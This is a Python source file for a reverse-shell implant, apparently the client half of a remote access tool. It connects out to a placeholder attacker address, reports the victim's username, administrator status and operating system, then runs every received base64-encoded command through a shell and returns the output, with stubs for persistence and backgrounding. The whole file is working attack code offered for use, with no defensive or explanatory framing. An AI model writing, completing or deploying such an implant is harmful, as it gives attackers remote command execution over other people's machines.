import socket
import subprocess
import os
import sys
import ctypes
import platform
import time
import base64




def inbound():
     print('[+] Awaiting response...')
     message = ""
     while True:
         try:
             message = sock.recv(1024).decode()
             message = base64.b64decode(message)
             message = message.decode().strip()
             return (message)
         except Exception:
             sock.close() 

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(message, encoding='utf8'))
    sock.send(response)



def session_handler():
    #Setting up the socket configuration
    try:
        print (f'[+] Connecting to {host_ip}.')
        sock.connect((host_ip, host_port))
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        print (f'[+] Connection established to {host_ip}.')
    
        while True:
            message = inbound()
            print(f'[+] Message Received! - {message}')
           
            if message == 'exit':
                print('[-] The server has terminated the session.')
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message == 'help':
                pass
            elif message.split(" ") [0] == 'cd':
                directory = str(message.split(" ")[1])
                try:
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                    print(f'[+] changed to {cur_dir}')
                except FileNotFoundError:
                    outbound('Invalid directory. Try again.')
                    continue
            elif message == 'background':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass
    
if __name__=='__main__':   
    try:
        host_ip = 'INPUT_IP_HERE'
        host_port = INPUT_PORT_HERE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session_handler()
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as e:
        print(e)